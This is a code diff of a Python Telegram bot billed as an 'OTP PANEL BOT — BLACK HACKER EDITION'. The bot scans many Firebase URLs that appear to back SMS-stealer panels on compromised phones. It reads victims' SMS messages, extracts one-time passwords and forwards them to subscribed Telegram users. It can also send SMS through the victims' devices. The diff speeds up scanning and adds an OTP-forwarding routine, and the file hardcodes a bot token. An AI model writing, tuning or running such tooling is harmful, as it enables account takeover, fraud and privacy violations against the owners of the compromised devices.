@@ -2,8 +2,8 @@
 """
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
-  Instant UI Response (Zero Lag) | Async Locks Fixed
-  Memory Optimized | Ghost Workers Alive
+  Autopilot RAM Cleaner | Zero-Lag Instant Reply System
+  Telegram API FloodWait Protected | Permanent Master Vault
 ══════════════════════════════════════════════════════
 """
 
@@ -33,7 +33,7 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# 🛑 Suppress Warnings
+# 🛑 Tame Logs for Railway (Saves Disk Space)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 logging.basicConfig(format="%(asctime)s — %(levelname)s — %(message)s", level=logging.WARNING)
 logging.getLogger("asyncio").setLevel(logging.CRITICAL)
@@ -48,8 +48,8 @@ PAGE_SIZE       = 20
 TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
 BOT_USERNAME    = "fjjhfbot"
 
-CHUNK_SIZE      = 50    # Optimized for speed & memory
-HTTP_CONCURRENCY= 200    
+CHUNK_SIZE      = 30    
+HTTP_CONCURRENCY= 300    
 
 ADMIN_IDS: set[int] = {
     6860106371,   
@@ -69,7 +69,6 @@ SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 LOCAL_TXT_DB_FILE = os.path.join("Extracted_URLs", "All_Normal_URLs.txt")
 
 seen_ids:  set[str] = set()   
-first_run: bool     = True
 _main_app: Optional[Application] = None
 _http_session: Optional[aiohttp.ClientSession] = None
 total_otps_processed = 0
@@ -78,8 +77,9 @@ all_users: dict[int, dict] = {}
 pending_action: dict[int, dict] = {}
 user_cooldowns: dict[int, float] = {}
 user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
-chats_registry: dict[str, set[int]] = {TOKEN: set()} 
-user_seen_unreg: dict[int, set[str]] = {}
+
+# 🔥 TELEGRAM API FLOODWAIT FIX (MAGIC CACHE)
+JOIN_VERIFIED_CACHE: dict[int, float] = {}
 
 MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
@@ -87,12 +87,9 @@ GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
 API_LOCK = asyncio.Lock()
 CACHE_LOCK = asyncio.Lock()  
 POLL_LOCK = asyncio.Lock()   
-WORKER_SEMAPHORE = asyncio.Semaphore(150) 
-PREFETCH_POOL: dict[str, list] = {}
-PREFETCH_TASKS: dict[str, asyncio.Task] = {}
+WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY) 
 
-# 🔥 LIMITER ONLY FOR HEAVY SCANS (Keeps UI Instant)
-HEAVY_TASK_LIMITER = asyncio.Semaphore(5) 
+HEAVY_TASK_LIMITER = asyncio.Semaphore(10) # Ensures heavy tasks don't hang UI
 
 scan_progress = {
     "scanned": 0,
@@ -130,7 +127,6 @@ def load_local_txt_dbs():
                         if url.startswith("http"):
                             loaded_urls.add(url)
             except: pass
-    print(f"✅ Loaded {len(loaded_urls)} URLs from Local Text DBs")
     return list(loaded_urls)
 
 RAW_URLS.extend(load_local_txt_dbs())
@@ -219,16 +215,24 @@ def save_settings():
     with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
         json.dump(SETTINGS, f, indent=4)
 
+# 🔥 AUTOPILOT RAM CLEANER (Prevents memory crash on Railway)
 async def auto_save_loop():
     while True:
         try:
-            await asyncio.sleep(60)
+            await asyncio.sleep(120)
             await asyncio.to_thread(save_settings)
             for uid in list(all_users.keys()):
                 await asyncio.to_thread(save_user, uid)
-            if len(seen_ids) > 50000:
+            
+            # Smart Memory Pruning
+            if len(seen_ids) > 20000:
                 seen_ids.clear()
-            gc.collect() 
+            
+            now_ts = time.time()
+            expired_users = [k for k, v in JOIN_VERIFIED_CACHE.items() if now_ts - v > 300]
+            for u in expired_users: JOIN_VERIFIED_CACHE.pop(u, None)
+            
+            gc.collect() # Force free unreferenced RAM
         except: await asyncio.sleep(5)
 
 async def hourly_admin_backup(app: Application):
@@ -271,18 +275,28 @@ def is_spamming(user_id: int) -> bool:
     if user_id in ADMIN_IDS: return False
     now = time.time()
     last_click = user_cooldowns.get(user_id, 0)
-    if now - last_click < 0.5: return True  # 🔥 Reduced spam cooldown so users feel it's faster
+    if now - last_click < 0.3: return True  # Extremely short cooldown for snappy feel
     user_cooldowns[user_id] = now
     return False
 
+# 🔥 MAGIC FLOODWAIT PROTECTOR (Zero Delay for Users)
 async def check_force_join(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS: return True
+    
+    now = time.time()
+    if user_id in JOIN_VERIFIED_CACHE and (now - JOIN_VERIFIED_CACHE[user_id]) < 300: 
+        return True # Verified within last 5 minutes -> Instant Pass (No API Call)
+        
     for chat in FORCE_JOIN_CHATS:
         try:
             member = await bot.get_chat_member(chat, user_id)
             if member.status in ['left', 'kicked', 'banned']: 
                 return False
-        except: pass
+        except Exception as e: 
+            if "not found" in str(e).lower() or "user not found" in str(e).lower(): return False
+            pass # Ignore API limits, give benefit of doubt if rate limited
+    
+    JOIN_VERIFIED_CACHE[user_id] = now
     return True
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -299,7 +313,7 @@ async def get_http_session() -> aiohttp.ClientSession:
         _http_session = aiohttp.ClientSession(connector=connector)
     return _http_session
 
-async def fb_get(path: str, base: str, timeout: int = 10) -> Optional[dict]:
+async def fb_get(path: str, base: str, timeout: int = 8) -> Optional[dict]:
     try:
         session = await get_http_session()
         url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
@@ -314,7 +328,7 @@ async def fb_keys(path: str, base: str) -> Optional[list[str]]:
     try:
         session = await get_http_session()
         url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
             if r.status != 200: return None
             data = await r.json(content_type=None)
             return list(data.keys()) if isinstance(data, dict) else []
@@ -324,7 +338,7 @@ async def fb_keys(path: str, base: str) -> Optional[list[str]]:
 #  API CHECKER FUNCTIONS 
 # ═══════════════════════════════════════════════════════
 
-async def check_number_api(service: str, number: str, retries=3) -> dict:
+async def check_number_api(service: str, number: str, retries=2) -> dict:
     async with WORKER_SEMAPHORE: 
         clean_number = re.sub(r"\D", "", str(number))[-10:]
         api_keys = SYS_SETTINGS.get("api_keys", [])
@@ -340,19 +354,19 @@ async def check_number_api(service: str, number: str, retries=3) -> dict:
             start_req = time.time()
             try:
                 session = await get_http_session()
-                async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=10)) as r:
+                async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
                     req_ms = int((time.time() - start_req) * 1000)
                     if r.status == 200: 
                         res = await r.json()
                         res["ms"] = req_ms
                         return res
                     elif r.status == 429:
-                        await asyncio.sleep(1.5 * (attempt + 1))
+                        await asyncio.sleep(1)
                         continue
                     else: return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
             except: 
                 if attempt == retries - 1: return {"status": "error", "message": "Timeout", "ms": int((time.time() - start_req) * 1000)}
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.5)
 
 async def fb_send_sms(device, to_number: str, msg: str):
     async with WORKER_SEMAPHORE:
@@ -361,14 +375,14 @@ async def fb_send_sms(device, to_number: str, msg: str):
             send_url = f"{device.base_url}/{base_node}/sendSMS.json"
             payload = {"number": to_number, "phone": to_number, "phoneNo": to_number, "message": msg, "msg": msg, "text": msg, "status": "pending"}
             session = await get_http_session()
-            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as r: pass
+            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=4)) as r: pass
         except: pass
 
 async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
     try:
         session = await get_http_session()
         url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=2"
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
             if r.status == 200:
                 data = await r.json(content_type=None)
                 if isinstance(data, dict) and len(data) > 0:
@@ -387,7 +401,7 @@ async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
     return False, 0.0
 
 # ═══════════════════════════════════════════════════════
-#  UTILITY FORMATTERS & MENUS (HTML SECURE)
+#  UTILITY FORMATTERS & MENUS
 # ═══════════════════════════════════════════════════════
 
 def get_checker_menu(prefix="chk_srv:"):
@@ -429,7 +443,7 @@ def device_list_header(devices: list[Device], page: int = 0) -> str:
         scanned = scan_progress.get("scanned", 0)
         tot = scan_progress.get("total", 1)
         pct = int((scanned / max(tot, 1)) * 100)
-        scan_text = f"⏳ <b>Live Exploit:</b> {scanned}/{tot} Servers ({pct}%)\n"
+        scan_text = f"⏳ <b>Autopilot Scan:</b> {scanned}/{tot} Servers ({pct}%)\n"
 
     return (
         f"☠️ <b>DARK WEB TERMINAL</b> ☠️\n━━━━━━━━━━━━━━━━━━\n"
@@ -692,7 +706,7 @@ async def _update_global_cache():
         scan_progress["scanned"] += len(chunk)
         
         temp_gathered.clear()
-        await asyncio.sleep(0.1) # 🔥 SLEEP REDUCED TO 0.1s FOR BLAZING FAST SCANNING
+        await asyncio.sleep(0.1) 
 
     scan_progress["is_scanning"] = False
 
@@ -834,7 +848,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         bot_token = ctx.bot.token
         users_db = all_users
 
-        # 🔥 UI INSTANT RESPONSE: Removes heavy limits from button clicks
         if data == "home" or data.startswith("pg:") or data == "online":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
@@ -1258,7 +1271,6 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await update.message.reply_text("☠️ <b>SUPER ADMIN CONSOLE</b>\nChoose override parameter:", reply_markup=kb, parse_mode="HTML")
             return
 
-        # 🔥 INSTANT UI FETCH (Zero Locks on simple clicks)
         if text == "📱 Devices List":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
@@ -1600,7 +1612,12 @@ async def _update_global_cache():
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
         temp_gathered = []
-        tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
+        # Wrapper to handle timeouts safely
+        async def fetch_with_timeout(tag, url):
+            try: await asyncio.wait_for(fetch_device_data_task(tag, url, temp_gathered), timeout=10)
+            except: pass
+            
+        tasks = [fetch_with_timeout(tag, url) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
         push_to_master_vault(temp_gathered)
@@ -1619,61 +1636,40 @@ async def global_cache_loop():
                 except: pass
         await asyncio.sleep(120) 
 
-async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
-    if users_db is None: users_db = {}
-    uinfo = users_db.get(chat_id, {})
-    is_vip = uinfo.get("vip_until", 0) > time.time()
-    is_admin = chat_id in ADMIN_IDS
-    custom_dbs = get_user_dbs(uinfo)
+async def _forward_sms(device: Device, sms: dict) -> None:
+    global total_otps_processed
+    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
+    if not body: return
+
+    total_otps_processed += 1
+    label = device_label(device)
+    otp   = extract_otp(body)
+    msg_text = auto_forward_msg(sms, label)
     
-    if not custom_dbs and (is_vip or is_admin):
-        return GLOBAL_DEVICE_CACHE.get("ALL", [])
+    master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
+    
+    kb_rows = []
+    if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+    kb_rows.append([
+        InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"),
+        InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}"),
+    ])
+    markup = InlineKeyboardMarkup(kb_rows)
 
-    dbs_to_check = []
-    if is_admin or is_vip:
-        dbs_to_check.extend(list(DATABASES.keys()))
-        for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
-            dbs_to_check.append(f"G_{i}")
+    send_tasks = []
+    for bot_token, chat_dict in list(user_focus.items()):
+        app_to_use = _main_app
+        if not app_to_use: continue
+
+        focused_chats = [cid for cid, did in chat_dict.items() if did == device.id]
+        for chat_id in set(focused_chats):
+            if otp: 
+                all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1
+                save_user(chat_id)
+            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
             
-    for i, _ in enumerate(custom_dbs):
-        dbs_to_check.append(f"U_{chat_id}_{i}")
-
-    devices = []
-    for tag in dbs_to_check:
-        for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
-            if d.db_tag == tag:
-                devices.append(d)
-                
-    return devices
-
-async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
-    try:
-        session = await get_http_session()
-        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
-            if r.status != 200: return []
-            data = await r.json(content_type=None)
-            if not data or not isinstance(data, dict): return []
-            entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
-            for s in entries:
-                ts_val = s.get("timestamp") or 0
-                try:
-                    s["_parsed_ts"] = float(ts_val)
-                    if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
-                except: s["_parsed_ts"] = 0.0
-            entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
-            if max_age_sec:
-                filtered = []
-                now = time.time()
-                for sms in entries:
-                    if (now - sms["_parsed_ts"]) <= max_age_sec: filtered.append(sms)
-                entries = filtered
-            return entries[:limit]
-    except: return []
-
-# ═══════════════════════════════════════════════════════
-#  POLLING ENGINE
-# ═══════════════════════════════════════════════════════
+    if send_tasks:
+        await asyncio.gather(*send_tasks, return_exceptions=True)
 
 async def poll_single_db(tag: str, url: str) -> None:
     try:
@@ -1741,7 +1737,6 @@ async def poll_single_db(tag: str, url: str) -> None:
                 await asyncio.sleep(0.1)
     except: pass
 
-POLL_LOCK = asyncio.Lock()
 async def poll_loop(app: Application) -> None:
     global _main_app
     _main_app = app
@@ -1781,8 +1776,7 @@ async def start_web_server():
         site = web.TCPSite(runner, '0.0.0.0', port)
         await site.start()
         print(f"✅ Web server started on port {port} (Railway Alive)")
-    except Exception as e:
-        pass
+    except: pass
 
 # ═══════════════════════════════════════════════════════
 #  MAIN ENTRY POINT
